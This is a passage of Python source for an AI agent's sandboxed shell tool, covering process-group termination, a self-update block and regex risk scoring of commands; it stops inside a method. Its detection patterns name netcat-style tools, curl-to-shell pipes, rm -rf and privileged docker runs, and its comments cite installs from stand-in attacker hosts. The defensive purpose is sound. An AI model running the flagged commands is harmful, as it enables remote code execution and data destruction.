"""
Shell execution tool — sandboxed command runner with deny-pattern guards,
workspace restriction, output truncation, and timeout enforcement.
"""

from __future__ import annotations

import asyncio
import contextlib
import os
import platform
import re
import shutil
import signal
import time
from pathlib import Path
from typing import Any

from loguru import logger

from praestoclaw.agent.tools.base import Tool, ToolMetadata
from praestoclaw.security.leak import redact_credentials
from praestoclaw.security.risk import RiskAssessment, RiskPrompt, RiskScore
from praestoclaw.security.sandbox import CommandDeniedError, PathDeniedError, Sandbox
from praestoclaw.utils.helpers import ensure_dir, get_data_dir

_IS_WINDOWS = platform.system() == "Windows"

# Windows console-signal isolation: certain shell tool subprocesses (and any
# descendants — cmd.exe, powershell, ``pc update``, etc.) share the daemon's
# console by default. If any descendant generates a CTRL_C_EVENT (or pieces of
# the Windows console subsystem do so on shutdown/teardown), the signal is
# broadcast to every process in the console group — including the daemon
# itself, which then exits via SIGINT. Spawning the shell tool child in its
# own process group breaks that propagation.
#
# Applied selectively via _ISOLATION_ALLOWLIST. Keep narrow: most shell
# commands do NOT need this, and isolating them changes user-facing Ctrl+C
# semantics. Add a pattern here only after confirming a command's process
# tree generates console signals that crash the daemon.
_WIN_CREATE_NEW_PROCESS_GROUP = 0
if _IS_WINDOWS:
    import subprocess as _subprocess

    _WIN_CREATE_NEW_PROCESS_GROUP = (
        _subprocess.CREATE_NEW_PROCESS_GROUP  # type: ignore[attr-defined]
    )

# Commands that MUST run in their own Windows console process group.
# Matched against the leading token sequence of the user's command, after
# stripping leading whitespace. Case-insensitive.
_ISOLATION_ALLOWLIST: tuple[re.Pattern[str], ...] = (
    # `pc update` / `praestoclaw update` (any args) — spawns powershell
    # Get-CimInstance for ancestor walk; some part of that tree generates
    # CTRL_C_EVENT to the console group, killing the daemon. See PR fixing
    # bot-triggered update silent failure.
    re.compile(r"^\s*(pc|praestoclaw)\s+update\b", re.IGNORECASE),
)


def _needs_console_isolation(command: str) -> bool:
    """Return True if *command* matches the Windows console-isolation allowlist."""
    if not _IS_WINDOWS:
        return False
    return any(pat.match(command) for pat in _ISOLATION_ALLOWLIST)


# ── PraestoClaw self-update guard ────────────────────────────────────────────
# The agent must NEVER update or (re)install its OWN package from a tool. Any
# such process is spawned inside the current turn's process tree, so a later
# interrupt (compaction, carrier timeout, user stop) runs ``taskkill /F /T`` on
# that tree and reaps the half-finished updater before it can detach — the
# upgrade silently fails and can leave the install corrupted. Updates are
# handled by the deterministic chat fast-path (channels/cloud.py ``_on_message``)
# which spawns the updater DETACHED from the agent. These patterns hard-block
# every shell spelling of self-update / self-install.
_SELF_UPDATE_SUBCMD = re.compile(
    r"\b(?:pc|praestoclaw)(?:-staging)?(?:\.(?:exe|cmd|bat))?\s+(?:update|upgrade)\b",
    re.IGNORECASE,
)
_SELF_UPDATE_MODULE = re.compile(
    r"\b(?:python[23]?(?:\.\d+)?(?:\.exe)?|py(?:\.exe)?(?:\s+-\d+(?:\.\d+)?)?)"
    r"\s+-m\s+praestoclaw"
    r"(?:\.cli\.update(?:_worker)?\b|\S*\s+(?:update|upgrade)\b)",
    re.IGNORECASE,
)
_SELF_PKG_INSTALL = re.compile(
    r"(?:\b(?:pip[23]?|pipx|uv)(?:\.exe)?\b"
    r"|\b(?:python[23]?(?:\.\d+)?(?:\.exe)?|py(?:\.exe)?(?:\s+-\d+(?:\.\d+)?)?)"
    r"\s+-m\s+pip\b)"
    r"[^\n]*\b(?:install|upgrade|reinstall)\b[^\n]*\bpraestoclaw\b",
    re.IGNORECASE,
)

_SELF_UPDATE_BLOCK_MESSAGE = (
    "BLOCKED: refusing to update or (re)install PraestoClaw from a tool. "
    "Running `pc update` / `praestoclaw update` / `pip install … praestoclaw` "
    "(or any equivalent) from inside the agent spawns the updater inside the "
    "current turn's process tree; when the turn is later interrupted "
    "(compaction, carrier timeout, or a user stop triggers `taskkill /T`) the "
    "in-flight updater is killed and the upgrade silently fails — sometimes "
    "corrupting the install. Updates are handled by a dedicated, deterministic "
    "fast-path that runs detached from the agent. Do NOT retry this via the "
    "shell. Instead, tell the user to reply with a single word in chat: "
    "`更新` or `升级` (中文) / `update` or `upgrade` (English)."
)

# Collapse shell line-continuations so a wrapped install is matched as one
# command: POSIX ``\``, PowerShell backtick, and cmd.exe caret ``^`` (cmd.exe
# is what ``asyncio.create_subprocess_shell`` uses on Windows under shell=auto).
_LINE_CONTINUATION = re.compile(r"[\\`^]\s*\r?\n")


def _is_self_update_command(command: str) -> bool:
    """True if *command* tries to update or (re)install PraestoClaw itself."""
    flat = _LINE_CONTINUATION.sub(" ", command)
    return bool(
        _SELF_UPDATE_SUBCMD.search(flat)
        or _SELF_UPDATE_MODULE.search(flat)
        or _SELF_PKG_INSTALL.search(flat)
    )


def _process_group_alive(pgid: int) -> bool:
    """Return True if a POSIX process group exists.

    ``os.killpg(pgid, 0)`` is a probe, not a signal delivery. PermissionError
    still proves the group exists.
    """
    try:
        os.killpg(pgid, 0)
        return True
    except ProcessLookupError:
        return False
    except PermissionError:
        return True


async def _wait_for_process_group_exit(
    proc: asyncio.subprocess.Process,
    pgid: int,
    timeout: float,
) -> bool:
    """Wait until a POSIX process group exits, not just its shell wrapper."""
    deadline = asyncio.get_running_loop().time() + timeout
    while asyncio.get_running_loop().time() < deadline:
        # Reap the direct child promptly. A dead but unreaped group leader
        # can make killpg(pgid, 0) report the group as still alive.
        if proc.returncode is None:
            with contextlib.suppress(TimeoutError, OSError):
                await asyncio.wait_for(proc.wait(), timeout=0.05)
        if not _process_group_alive(pgid):
            return True
        await asyncio.sleep(0.05)
    if proc.returncode is None:
        with contextlib.suppress(TimeoutError, OSError):
            await asyncio.wait_for(proc.wait(), timeout=0.1)
    return not _process_group_alive(pgid)


async def _kill_proc_tree(proc: asyncio.subprocess.Process) -> None:
    """Terminate a subprocess and wait for it to exit.

    On Windows ``proc.kill()`` only terminates the direct process; child
    processes (e.g. a python child spawned by bash/cmd) keep running and
    hold the pipes open.  ``taskkill /F /T`` is used here to terminate the
    whole process tree.  On POSIX platforms shell tool subprocesses are
    started in their own process group, so ``os.killpg`` can terminate the
    wrapper and descendants together (e.g. shell -> python -> ffmpeg).

    All waits are bounded to avoid hanging the timeout handler.
    All kill calls suppress ``OSError`` / ``ProcessLookupError`` for
    already-exited processes so cleanup is best-effort and never raises.
    """
    kill_timeout = 5.0
    if _IS_WINDOWS:
        # /F = force, /T = tree (children), /PID = by process id
        # Use absolute path to prevent PATH hijack from workspace.
        _taskkill = os.path.join(
            os.environ.get("SystemRoot", r"C:\Windows"), "System32", "taskkill.exe"
        )
        try:
            kill_proc = await asyncio.create_subprocess_exec(
                _taskkill,
                "/F",
                "/T",
                "/PID",
                str(proc.pid),
                stdout=asyncio.subprocess.DEVNULL,
                stderr=asyncio.subprocess.DEVNULL,
            )
            try:
                await asyncio.wait_for(kill_proc.wait(), timeout=kill_timeout)
            except TimeoutError:
                try:
                    kill_proc.kill()
                    await asyncio.wait_for(kill_proc.wait(), timeout=2)
                except (OSError, TimeoutError):
                    pass
                try:
                    proc.kill()
                except OSError:
                    pass
            else:
                if kill_proc.returncode != 0:
                    try:
                        proc.kill()
                    except OSError:
                        pass
        except OSError:
            try:
                proc.kill()
            except OSError:
                pass
    else:
        try:
            pgid = os.getpgid(proc.pid)
        except OSError:
            pgid = None

        current_pgid = os.getpgrp()
        # Only signal a process group we can prove this shell tool created:
        # start_new_session=True makes the direct child the session/group
        # leader, so pgid == proc.pid. For any other process (legacy tests,
        # non-isolated/pre-existing proc handles, or a reused external group),
        # fall back to direct proc.kill() to avoid terminating unrelated
        # processes that happen to share the same PGID.
        handled_group = False
        if pgid is not None and pgid != current_pgid and pgid == proc.pid:
            try:
                os.killpg(pgid, signal.SIGTERM)
            except ProcessLookupError:
                pass
            except OSError:
                pgid = None
            else:
                handled_group = True
                if not await _wait_for_process_group_exit(proc, pgid, timeout=2.0):
                    try:
                        os.killpg(pgid, signal.SIGKILL)
                    except (ProcessLookupError, OSError):
                        pass
                    await _wait_for_process_group_exit(proc, pgid, timeout=kill_timeout)

        # Fallback for pre-existing/non-isolated processes. Never signal the
        # daemon's own process group.
        if not handled_group:
            try:
                proc.kill()
            except OSError:
                pass

    try:
        await asyncio.wait_for(proc.wait(), timeout=kill_timeout)
    except (TimeoutError, OSError):
        pass


def _has_unquoted_compound(cmd: str) -> bool:
    """Check for ``|``, ``||``, ``&&``, ``&``, or ``;`` outside of quotes.

    Skips fd-redirect forms (``2>&1``, ``1>&2``, ``&>``, ``&>>``) which are
    NOT compound operators.
    """
    _, is_compound = _split_compound_segments(cmd)
    return is_compound


def _split_compound_segments(cmd: str) -> tuple[list[str], bool]:
    """Split *cmd* on top-level ``|``, ``||``, ``&&``, ``&``, ``;`` separators.

    Quote-aware (single/double); skips fd-redirect forms (``2>&1``, ``&>``).
    Returns ``(non-empty segments, saw_separator)``.

    The ``saw_separator`` flag is True iff at least one top-level separator
    was consumed, even if the leading or trailing position is empty.  This
    matters for forms where the separator IS the dangerous bit:

    * ``cmd &`` — background execution; the trailing position is empty
      but the ``&`` itself decouples ``cmd`` from the parent shell's
      lifecycle.  Without the flag, ``len(segments) > 1`` would treat
      this as non-compound and let it skip the compound risk path.
    * ``cmd ;`` — degenerate form with empty tail.
    * ``;cmd`` / ``& cmd`` — leading empty position.

    Per-segment scorers should iterate the returned list (which is always
    non-empty for any non-empty input).  Compound classification ("is
    this a chained command?") MUST use the ``saw_separator`` flag.
    """
    in_single = False
    in_double = False
    segments: list[str] = []
    saw_separator = False
    start = 0
    i = 0
    n = len(cmd)
    while i < n:
        c = cmd[i]
        cut = 0  # number of chars consumed by separator (0 = not a separator)
        if c == "'" and not in_double:
            in_single = not in_single
        elif c == '"' and not in_single:
            in_double = not in_double
        elif not in_single and not in_double:
            if c == "|":
                cut = 2 if i + 1 < n and cmd[i + 1] == "|" else 1
            elif c == ";":
                cut = 1
            elif c == "&":
                # Skip fd-redirect: &> / &>>  and  N>&M (digit before >).
                if i + 1 < n and cmd[i + 1] == ">":
                    i += 1  # skip past &>; the > is not a separator either
                elif i > 0 and cmd[i - 1] == ">":
                    pass  # >&1 / >&2 — part of N>&M, not a separator
                else:
                    cut = 2 if i + 1 < n and cmd[i + 1] == "&" else 1
        if cut:
            saw_separator = True
            seg = cmd[start:i].strip()
            if seg:
                segments.append(seg)
            i += cut
            start = i
            continue
        i += 1
    tail = cmd[start:].strip()
    if tail:
        segments.append(tail)
    return segments, saw_separator


def _has_unquoted_redirect(cmd: str) -> bool:
    """Check for file-targeting ``>``/``>>``/``&>``/``&>>`` outside quotes.

    Only skips fd-dup forms where ``>&`` is followed by a single digit
    (``>&1``, ``>&2``, ``2>&1``).  All other ``>`` are treated as file
    redirects, including bash ``&>`` / ``&>>`` (stdout+stderr to file).
    """
    in_single = False
    in_double = False
    i = 0
    n = len(cmd)
    while i < n:
        c = cmd[i]
        if c == "'" and not in_double:
            in_single = not in_single
        elif c == '"' and not in_single:
            in_double = not in_double
        elif c == ">" and not in_single and not in_double:
            if i > 0 and cmd[i - 1] == ">":
                pass  # second > in >> or &>> (first > already counted)
            elif i + 1 < n and cmd[i + 1] == "&":
                # >&digit is fd-dup (e.g. >&1, 2>&1). >&nondigit is file redirect.
                if i + 2 < n and cmd[i + 2].isdigit():
                    pass  # fd-dup: >&1, >&2
                else:
                    return True  # >&somefile — file redirect
            else:
                return True  # plain > or >> or &> or &>>
        i += 1
    return False


# ── Risk assessment patterns ─────────────────────────────────────────────────

# File-reading commands — score based on target file path (reuse filesystem logic).
_SHELL_FILE_READ = re.compile(
    r"^(cat|head|tail|less|more|file|stat|wc|type)\s+(.+)",
    re.IGNORECASE,
)
# Directory-reading commands — score based on target path.
_SHELL_DIR_READ = re.compile(
    r"^(ls|dir|tree|du|df)\b(?:\s+(.+))?",
    re.IGNORECASE,
)
# Pure info commands — always 0, no file target.
_SHELL_INFO = re.compile(
    r"^(pwd|whoami|hostname|uname|date|id|env|printenv|set|echo|which|where|"
    r"where\.exe|Start-Sleep)\b",
    re.IGNORECASE,
)
# Search commands — score based on search path.
_SHELL_SEARCH = re.compile(
    r"^(find|grep|rg|ag|awk|sed\s+-n|sort|uniq|cut|tr|diff|md5sum|sha256sum)\b",
    re.IGNORECASE,
)
# Linters (read-only analysis) → 2
_SHELL_LINTER = re.compile(
    r"^(ruff\s+check|mypy|pyright|pylint|flake8|eslint|tsc)\b",
    re.IGNORECASE,
)
# Test runners (may create/modify files) → 3
_SHELL_TEST = re.compile(
    r"^(pytest|(?:python[23]?(?:\.\d+)?|py)\s+-m\s+pytest|(?:python[23]?(?:\.\d+)?|py)\s+-m\s+unittest|"
    r"npm\s+test|npx\s+jest|npx\s+vitest|go\s+test|"
    r"cargo\s+test|dotnet\s+test)\b",
    re.IGNORECASE,
)
# Formatters (modify files in place) → 3
_SHELL_FORMATTER = re.compile(
    r"^(ruff\s+format|black|prettier|gofmt|rustfmt|dotnet\s+format)\b",
    re.IGNORECASE,
)
# Info commands for toolchains → 0
_SHELL_TOOLCHAIN_INFO = re.compile(
    r"^(dotnet\s+--info|dotnet\s+--list-sdks|dotnet\s+--list-runtimes|"
    r"dotnet\s+--version|node\s+--version|(?:python[23]?(?:\.\d+)?|py)\s+--version|"
    r"go\s+version|rustc\s+--version|java\s+--version)\b",
    re.IGNORECASE,
)
# Trivial project setup → 2
_SHELL_PROJECT_INIT = re.compile(
    r"^(dotnet\s+new)\b",
    re.IGNORECASE,
)
# Build / restore (compile, no install to system) → 3
_SHELL_BUILD = re.compile(
    r"^(npm\s+(run\s+)?build|yarn\s+build|cmake|"
    r"cargo\s+build|go\s+build|dotnet\s+build|dotnet\s+publish|dotnet\s+restore|"
    r"pip\s+wheel|(?:python[23]?(?:\.\d+)?|py)\s+setup\.py|(?:python[23]?(?:\.\d+)?|py)\s+-m\s+build)\b",
    re.IGNORECASE,
)
# Reproducible / editable install — lockfile, requirements, or local source.
# Score 3: reproducible by definition (lockfile pinned or local code).  Checked
# BEFORE the remote-install pattern below so `pip install -e .` and `npm ci`
# don't get the supply-chain treatment.
#
# SECURITY: ``-e`` / ``-r`` arguments must point at a LOCAL path WITH AN
# EXPLICIT LOCAL PREFIX.  Two distinct attacker bypasses we close here:
#
#   1. Remote VCS / URL: ``pip install -e git+https://attacker/x.git`` runs
#      install-time code from an attacker-controlled origin.  Rejected by
#      the leading scheme-prefix lookahead.
#
#   2. Bare relative name: ``pip install -r reqs.txt`` (no ``./``).  Pip
#      resolves this against cwd; an attacker who got a ``reqs.txt``
#      dropped via earlier prompt injection (or who is sitting in a
#      directory the attacker controls) would silently auto-install
#      whatever the file lists.  Rejected by requiring an explicit prefix
#      (``.``, ``..``, ``./``, ``../``, ``/``, ``\``, ``~``, drive letter).
#
# Allowed local-path forms (deterministic 3):
#   .  ./pkg  ../sib  /abs/path  ~/repo  C:\path  C:/path
#   .[extras]  ./pkg[extras]
# Bare-name and URL/VCS forms fall through to ``_SHELL_INSTALL_REMOTE``
# (range 6-8) so the user gets a Timeout-auto prompt.  Skill authors who
# want fast-path treatment for a vendored requirements file write
# ``-r ./reqs.txt`` — three extra characters that document "this path is
# the workspace, and the workspace is the trust boundary".
#
# The character class after the prefix uses ``[^\s'"]*`` so it stops at
# whitespace and quote boundaries, allowing the rest of the regex to
# enforce ``\s*$`` (no extra positional args after the source) and
# preventing ``pip install -e ./safe evil-typosquat`` from short-circuiting.

# Local-path source: explicit prefix required, then any non-whitespace /
# non-quote chars, then optional ``[extras]`` group.  Wrapped in optional
# matched quotes so ``-e "./pkg"`` and ``-e './pkg'`` are accepted.
_PIP_LOCAL_PATH = (
    r"['\"]?"
    r"(?:"
    r"\.\.?"  # bare "." or ".."
    r"|\.{1,2}[\\/][^\s'\"]*"  # ./... or ../...
    r"|[\\/][^\s'\"]*"  # /abs/...  \abs\...
    r"|~[\\/]?[^\s'\"]*"  # ~ or ~/foo
    r"|[A-Za-z]:[\\/][^\s'\"]*"  # C:\... or C:/...
    r")"
    r"(?:\[[\w,.\s-]+\])?"  # optional [extras]
    r"['\"]?"
)

_SHELL_INSTALL_LOCKFILE = re.compile(
    r"^(?:"
    # pip install -e <LOCAL-PATH>
    r"(?:pip|(?:python[23]?(?:\.\d+)?|py)\s+-m\s+pip)\s+install\s+"
    r"(?:-e|--editable)\s+"
    + _PIP_LOCAL_PATH
    + r"\s*$"
    + r"|"
    # pip install -r <LOCAL-REQUIREMENTS-FILE> (same prefix rules; bare
    # relative names like ``reqs.txt`` fall through to supply-chain).
    + r"(?:pip|(?:python[23]?(?:\.\d+)?|py)\s+-m\s+pip)\s+install\s+"
    r"(?:-r|--requirement)\s+"
    + _PIP_LOCAL_PATH
    + r"\s*$"
    + r"|"
    # Lockfile-driven installers — pin file is local by construction.
    # Strict no-extra-args form for npm ci / yarn install / pnpm install
    # so ``--registry=http://evil/`` overrides force fall-through.
    + r"npm\s+ci\s*$"
    r"|yarn\s+install\s*$"
    r"|yarn\s+install\s+(?:--frozen-lockfile|--immutable)\s*$"
    r"|pnpm\s+install\s+(?:--frozen-lockfile|--lockfile-only)\s*$"
    r")",
    re.IGNORECASE,
)
# Remote / registry install of arbitrary packages — supply-chain attack surface.
# Floor at 6 (Timeout-auto in standard profile) so even "looks safe" packages
# get a user-visible notification before executing install scripts.
_SHELL_INSTALL_REMOTE = re.compile(
    r"^("
    r"pip\s+install|(?:python[23]?(?:\.\d+)?|py)\s+-m\s+pip\s+install|"
    r"pipx\s+install|uv\s+(?:pip\s+)?install|uvx\s+install|"
    r"npm\s+(?:i|install|add)|yarn\s+add|pnpm\s+add|"
    r"dotnet\s+add\s+package|dotnet\s+tool\s+install|"
    r"cargo\s+install|go\s+install|gem\s+install|"
    r"brew\s+install|apt(?:-get)?\s+install|yum\s+install|dnf\s+install|"
    r"choco\s+install|winget\s+install|scoop\s+install"
    r")\b",
    re.IGNORECASE,
)
# `make <target>` — generic build tool, content-dependent, LLM scores.
_SHELL_MAKE = re.compile(r"^make(\s|$)", re.IGNORECASE)
# Docker / podman run with host volume mount — privilege escalation surface.
# Floor at 6; LLM evaluates the host path for sensitivity (workspace vs ~/.ssh
# vs system root).  Matches -v, --volume, and --mount.
_SHELL_DOCKER_VOLUME = re.compile(
    # Note: an earlier draft used ``.*(\s|^)(-v|--volume|--mount)`` — the
    # ``^`` alternative there is dead because after ``.*`` consumes any
    # characters, the engine is no longer at start-of-string.  ``\s`` alone
    # (whitespace before the flag) is the only reachable branch and
    # correctly excludes glued-on forms like ``--volumes-from`` (which is a
    # different flag and shouldn't trip this rule).
    r"^(docker|podman)\s+(run|create)\b.*\s(-v|--volume|--mount)(\s|=)",
    re.IGNORECASE,
)
# Docker / podman run with privilege escalation flags — host takeover risk.
# --privileged, --pid=host, --network=host, --userns=host, --cap-add=ALL.
_SHELL_DOCKER_PRIVILEGED = re.compile(
    r"^(docker|podman)\s+(run|create)\b.*"
    r"(--privileged|--pid[= ]host|--network[= ]host|--ipc[= ]host|"
    r"--userns[= ]host|--cap-add[= ](ALL|SYS_ADMIN|SYS_PTRACE))",
    re.IGNORECASE,
)
# npx / dotnet run → LLM (4~8), runs arbitrary code
_SHELL_EXEC_ARBITRARY = re.compile(
    r"^(npx\s|dotnet\s+run)\b",
    re.IGNORECASE,
)
# Publish / DB migration → LLM (5~8), affects external systems
_SHELL_PUBLISH = re.compile(
    r"^(dotnet\s+nuget\s+push|npm\s+publish|dotnet\s+ef\s+database)\b",
    re.IGNORECASE,
)
# curl/wget piped to shell → 9
_SHELL_CURL_PIPE = re.compile(
    r"\b(curl|wget)\b.*\|\s*(ba)?sh\b",
    re.IGNORECASE,
)
# General pipe to interpreter → LLM (includes PowerShell variants)
_SHELL_PIPE_EXEC = re.compile(
    r"\|\s*(ba)?sh\b|\|\s*python\b|\|\s*node\b|\|\s*eval\b|"
    r"\|\s*pwsh\b|\|\s*powershell\b|\|\s*iex\b|\|\s*Invoke-Expression\b",
    re.IGNORECASE,
)
# Common cleanup targets (gitignored / build artifacts / temp files) → 4
# Well-known build artifacts / cache / temp directories and glob patterns.
# Match: rm [-rf] <known-target> (end of string — no other args).
_CLEANUP_TARGETS = (
    r"__pycache__|\.pytest_cache|\.mypy_cache|\.ruff_cache|\.tox"
    r"|node_modules|\.next|\.nuxt|\.output"
    r"|bin[\\/]Debug|bin[\\/]Release|obj"
    r"|target[\\/]debug|target[\\/]release"
    r"|\.cache"
    r"|\*\.pyc|\*\.pyo|\*\.tmp|\*\.log|\*\.bak"
)
_SHELL_CLEANUP = re.compile(
    rf"^rm\s+(-r\s+|-rf\s+|-f\s+)?({_CLEANUP_TARGETS})[\\/]?$",
    re.IGNORECASE,
)
# rm -rf (recursive force, not cleanup) → 7
_SHELL_RM_RF = re.compile(r"^rm\s+-rf\s", re.IGNORECASE)
# rm (single file or directory) → 5
_SHELL_RM = re.compile(r"^(rm|rmdir|del|rd|shred|unlink)\b", re.IGNORECASE)
_SHELL_NETWORK = re.compile(
    r"\b(curl|wget|ssh|scp|rsync|nc|ncat|netcat|telnet|ftp)\b",
    re.IGNORECASE,
)
_SHELL_DELETE = re.compile(
    r"\b(rm|rmdir|del|rd|shred|unlink)\b",
    re.IGNORECASE,
)
_SHELL_ELEVATED = re.compile(
    r"\b(sudo|runas|doas|pkexec|su\s)\b",
    re.IGNORECASE,
)
_SHELL_REDIRECT_SYSTEM = re.compile(
    r">{1,2}\s*/etc/|>{1,2}\s*/usr/|>{1,2}\s*C:\\Windows",
    re.IGNORECASE,
)

# ── Git commands (checked in order: force → push → remote → read → write) ────

# Git force push / hard reset / clean / destructive branch-tag delete → 7
# Matches: -f (standalone or combined like -fu), --force, --force-with-lease
_SHELL_GIT_FORCE = re.compile(
    r"^git\s+("
    r"push\s+.*(-[a-zA-Z]*f[a-zA-Z]*(\s|$)|--force)|"
    r"reset\s+--hard|"
    r"clean\s+-[fdxX]|"
    r"branch\s+(?-i:-D)\b|"
    r"tag\s+-d\b"
    r")",
    re.IGNORECASE,
)
# Git push (non-force, checked after force) → 5
_SHELL_GIT_PUSH = re.compile(r"^git\s+push\b", re.IGNORECASE)
# Git fetch / pull / clone → 4
_SHELL_GIT_REMOTE = re.compile(
    r"^git\s+(fetch|pull|clone)\b",
    re.IGNORECASE,
)
# Git read-only → 0
# Only subcommands that are ALWAYS read-only regardless of flags.
# branch/tag/remote/config have both read and write forms → handled in _WRITE.
# reflog without subcommand is read; reflog expire/delete are destructive → _WRITE.
_SHELL_GIT_READ = re.compile(
    r"^git\s+(status|log|diff|show|blame|shortlog|describe|"
    r"ls-files|ls-tree|rev-parse|rev-list|version|help|"
    r"grep|stash\s+(list|show)|reflog(?!\s+(expire|delete)))\b",
    re.IGNORECASE,
)
# Git local write → 3
# Includes branch/tag/remote/config (have write forms; read forms are low-risk
# at score 3 anyway — trivially reversible, acceptable conservative score).
_SHELL_GIT_WRITE = re.compile(
    r"^git\s+(add|commit|stash|checkout|switch|merge|rebase|cherry-pick|"
    r"reset|am|apply|mv|restore|bisect|worktree|init|"
    r"branch|tag|remote|config|submodule|reflog)\b",
    re.IGNORECASE,
)

# ── File operations ──────────────────────────────────────────────────────────

_SHELL_CD = re.compile(r"^cd(\s|$)", re.IGNORECASE)
_SHELL_FILE_CREATE = re.compile(r"^(mkdir|touch)\b", re.IGNORECASE)
_SHELL_FILE_COPY = re.compile(r"^(cp|copy|mv|move|rename|ln)\b", re.IGNORECASE)
_SHELL_ARCHIVE = re.compile(
    r"^(tar|zip|unzip|gzip|gunzip|7z|bzip2|xz)\b",
    re.IGNORECASE,
)

# ── Package manager info ─────────────────────────────────────────────────────

# Local-only queries (no network) → 0
_SHELL_PKG_LOCAL = re.compile(
    r"^("
    r"pip\s+(list|show|freeze|check|--version)|"
    r"(?:python[23]?(?:\.\d+)?|py)\s+-m\s+pip\s+(list|show|freeze|check)|"
    r"npm\s+(ls|list|--version)|"
    r"yarn\s+(list|why|--version)|"
    r"dotnet\s+(list|nuget\s+list|tool\s+list)|"
    r"cargo\s+(tree|metadata|--version)|"
    r"go\s+(list|mod\s+(graph|verify)|version)"
    r")\b",
    re.IGNORECASE,
)
# Network-querying package commands (contact registry) → 1
_SHELL_PKG_NETWORK = re.compile(
    r"^("
    r"pip\s+index|(?:python[23]?(?:\.\d+)?|py)\s+-m\s+pip\s+index|"
    r"npm\s+(info|view|outdated|audit(?!\s+fix))|"
    r"yarn\s+(info|outdated)"
    r")\b",
    re.IGNORECASE,
)

# ── Script file execution → 3 (known file, can't see content) ───────────────

# Only match known script extensions. Bare `./gradlew` or `./configure` could
# run arbitrary code and should fall through to the ambiguous LLM path.
_SHELL_SCRIPT_FILE = re.compile(
    r"^("
    r"(?:python[23]?(?:\.\d+)?|py)\s+[\w./\\-]+\.pyw?\b|"  # python script.py / .pyw
    r"node\s+[\w./\\-]+\.(js|mjs|cjs)\b|"  # node app.js
    r"bash\s+[\w./\\-]+\.(sh|bash)\b|"  # bash script.sh
    r"sh\s+[\w./\\-]+\.(sh|bash)\b|"  # sh script.sh
    r"\.[\\/](?:[\w.-]+[\\/])*[\w.-]+\.(sh|bash|py|pyw|js|mjs|cjs|ps1)\b"  # ./scripts/run.sh
    r")",
    re.IGNORECASE,
)

# ── Inline / dynamic code execution → LLM (content determines risk) ─────────
# These run CODE CONTENT that is visible in the command string.  The LLM must
# evaluate the payload, not just the interpreter.  See _SECURITY_SHELL.md §
# "Inline & dynamic script execution".

_SHELL_INLINE_EXEC = re.compile(
    r"^("
    r"(?:python[23]?(?:\.\d+)?|py)\s+-c\s|"  # python -c "..."
    r"(?:python[23]?(?:\.\d+)?|py)\s+-m\s|"  # python -m module (unknown module)
    r"node\s+-e\s|"  # node -e "..."
    r"bash\s+-c\s|sh\s+-c\s|"  # bash -c "..." / sh -c "..."
    r"pwsh\s+(-c|-Command)\s|"  # pwsh -c/-Command "..."
    r"powershell\s+(-c|-Command)\s"  # powershell -Command "..."
    r")",
    re.IGNORECASE,
)

# ── PowerShell cmdlet (read-like verbs) → LLM for path-aware scoring ────────
# Bare PS cmdlet calls (not wrapped in powershell -Command).
# Get-*, Test-*, Select-*, Measure-*, Where-*, Format-*, Sort-*, Group-*

_SHELL_PS_READ = re.compile(
    r"^(Get-|Test-|Select-|Measure-|Where-|Format-|Sort-|Group-|"
    r"Compare-|ConvertTo-|ConvertFrom-|Out-String|Write-Output|"
    r"Select-String)\w*\b",
    re.IGNORECASE,
)

# ── PowerShell expression → LLM (may hide side effects like .Delete()) ──────
# Parenthesized expressions starting with read cmdlets: (Get-Item ...), (Get-Date)

_SHELL_PS_EXPR_READ = re.compile(r"^\((Get-|Test-|Measure-|Select-)", re.IGNORECASE)

# ── GitHub CLI ───────────────────────────────────────────────────────────────

_SHELL_GH_READ = re.compile(
    r"^gh\s+("
    r"pr\s+(list|view|diff|checks|status)|"
    r"issue\s+(list|view|status)|"
    r"repo\s+(view|list)|"
    r"run\s+(list|view|watch)|"
    r"release\s+(list|view)|"
    r"auth\s+status|copilot"
    r")\b",
    re.IGNORECASE,
)
# gh repo clone → 4 (same as git clone — downloads remote code)
_SHELL_GH_CLONE = re.compile(r"^gh\s+repo\s+clone\b", re.IGNORECASE)
# gh api without explicit method is GET (read), but with -X POST/PUT/DELETE is write.
# Route `gh api` to LLM via the ambiguous section for method-aware scoring.
_SHELL_GH_WRITE = re.compile(
    r"^gh\s+("
    r"pr\s+(create|merge|close|comment|review|edit|reopen|ready)|"
    r"issue\s+(create|close|comment|edit|reopen)|"
    r"repo\s+(fork)|"
    r"release\s+(create|delete|edit)|"
    r"run\s+(cancel|rerun)"
    r")\b",
    re.IGNORECASE,
)

# Shell executable resolution for each mode
_SHELL_EXECUTABLES: dict[str, list[str]] = {
    "bash": ["bash"],
    "cmd": ["cmd.exe"],
    "powershell": ["pwsh", "powershell"],
}


def _resolve_shell(mode: str) -> tuple[str | None, list[str]]:
    """Resolve shell executable and prefix args.

    Returns ``(executable, prefix_args)``. ``executable=None`` means use the
    OS default via :func:`asyncio.create_subprocess_shell` (legacy path).

    Supports named modes (auto/bash/cmd/powershell) and arbitrary paths.
    """
    if mode == "auto":
        return None, []

    # Named modes
    candidates = _SHELL_EXECUTABLES.get(mode)
    if candidates:
        for candidate in candidates:
            path = shutil.which(candidate)
            if path:
                if mode == "cmd":
                    return path, ["/c"]
                if mode == "powershell":
                    return path, ["-NoProfile", "-Command"]
                return path, ["-c"]
        return None, []  # fallback to default

    # Arbitrary path (e.g. "/usr/bin/zsh", "C:\\cygwin\\bin\\sh.exe")
    resolved = shutil.which(mode)
    if resolved:
        return resolved, ["-c"]

    return None, []  # fallback to default


def _force_explicit_shell() -> tuple[str, list[str]]:
    """Resolve ``auto`` to an explicit shell argv — used only when the OS
    sandbox needs to wrap argv (``create_subprocess_shell`` has no argv to
    wrap). Hardcoded paths to avoid PATH-hijack: a wrapped subprocess
    running an attacker-controlled ``sh`` in the workspace would defeat
    the purpose of sandboxing.
    """
    if _IS_WINDOWS:
        # SystemRoot is fundamental to Windows and always set; falling back
        # to "cmd.exe" alone would be a PATH lookup.
        system_root = os.environ.get("SystemRoot", r"C:\Windows")
        return os.path.join(system_root, "System32", "cmd.exe"), ["/c"]
    return "/bin/sh", ["-c"]


class ShellTool(Tool):
    """Execute shell commands within the workspace sandbox."""

    risk_range = (0, 10)
    _MAX_BACKGROUND = 3

    def __init__(self, sandbox: Sandbox) -> None:
        self._sandbox = sandbox
        self._background: dict[int, asyncio.subprocess.Process] = {}  # pid → proc
        self._background_owner: dict[int, str] = {}  # pid → owning session id (for teardown)

    async def kill_all_background(self) -> int:
        """Kill all background processes. Called on E-stop or session end.

        Returns number of processes that were confirmed terminated.
        Processes that survive are kept in the dict for retry on next call.
        """
        killed = 0
